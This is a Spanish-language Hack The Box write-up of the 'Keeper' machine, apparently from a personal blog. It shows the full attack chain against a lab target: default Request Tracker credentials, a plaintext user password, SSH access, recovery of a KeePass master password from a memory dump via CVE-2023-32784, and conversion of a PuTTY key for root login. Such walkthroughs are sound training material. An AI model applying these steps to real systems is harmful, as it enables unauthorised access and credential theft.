---
title: "Keeper - WriteUp"
date: Sun Feb 23 2025 12:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, cve, exploit, nginx, linux, ssh, bash, john]
image: /assets/img/htb-writeups/Pasted image 20231125165125.png
---

{% include machine-info.html
  machine="Keeper"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Keeper](/assets/img/htb-writeups/Pasted image 20231125165125.png)

-----

Máquina Linux

NMAP:
```bash
# Nmap 7.94SVN scan initiated Sat Nov 25 16:49:44 2023 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.133.129
Nmap scan report for 10.129.133.129
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125165125.png)

Agregamos el dominio de virtual hosting y volvemos a acceder. En este caso agregaremos tickets.keeper.htb y keeper.htb.

Al entrar nos llama la atención esto:

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125170113.png)

Buscando información en internet, leemos que las credenciales por defecto son root:password.

https://github.com/bestpractical/rt

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125170231.png)

Las probamos, por si acaso.

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125170323.png)

Increíble pero funciona. Ahora debemos investigar cómo acceder al sistema.

Vemos una lista de correos enviados a root desde la cuenta de Lisa Norgaard:

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125171701.png)

Existe una base de datos de Keepass pero la ha movido a su carpeta de usuario por seguridad.

Si nos vamos a usuario y abrimos la ficha de Lise, encontramos un password en texto plano.

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125171951.png)

Apuntamos las credenciales:

```http
lnorgaard:Welcome2023!
```

Vamos a proba estas credenciales por SSH.

```bash
$ ssh lnorgaard@keeper.htb
```

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125172257.png)

Y para adentro, además tiene correo pendiente de leer... peor no tiene nada.

Registramos la primera bandera y seguimos.

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125172709.png)

Como decía en el correo tiene la base de datos en fomrato keepass en un archivo ZIP en su directorio home. Como la máquina dispone de Python, nos vamos a compartir por http su carpeta y nos vamos a traer el archivo a nuestra máquina.

```bash
$ unzip RT30000.zip

Archive:  RT30000.zip
 inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx 
```

Vamos a usar a nuestro amigo _john_ para intentar romper la contraseña de la BBDD de _KeePass_

```bash
$ keepass2john passcodes.kdbx
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
```

Copamos el hash en un archivo que llamaremos "hash.keepass" y se lo daremos amablemente a _john_

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125173756.png)

Así podemos estar mil años para romper la contraseña y por algo se nos ofrece el dump. Así que vamos a investigar un poco.

Encontramos en internet un exploit de KeePass que emplea el archivo .dump para romper la contraseña (CVE-2023–32784)

https://github.com/vdohney/keepass-password-dumper

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125174238.png)

Nos clonamos el repositorio y lo ejecutamos:

```bash
$ dotnet run ../KeePassDumpFull.dmp
```

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125175150.png)

Tenemos una palabra en Danés posiblemente y una letra que no ha logrado descifrar. Vamos a hacer una búsqueda en San Google para ver si nos la completa.

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125175400.png)

Es el nombre de un postre y la letra que nos faltaba es la "r".

Tenemos la contraseña: _rødgrød med fløde_

Vamos a abrir la base de datos con keepass

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125175903.png)

Tenemos la contraseña y un archivo ppk de certificado para _Putty_

Nos copiamos la clave de Putty y lo guardaremos en un archivo con extensión .ppk, por ejemplo _keepass.ppk_

Ahora debemos convertir este archivo en un archivo de clave privada SSH para que nos sirva para conectar a la máquina como root.

Más info https://www.baeldung.com/linux/ssh-key-types-convert-ppk

Ahora con _puttygen_ haremos la conversión que necesitamos.

```bash
$ puttygen keepass.ppk -O private-openssh -o id_rsa
```

Y para acabar, entramos como root...

```bash
$ ssh -i id_rsa root@keeper.htb
```

![KEEPER](/assets/img/htb-writeups/Pasted image 20231125181431.png)

Registramos bandera de root y reto conseguido!
---

**Última actualización**: 2025-02-23<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
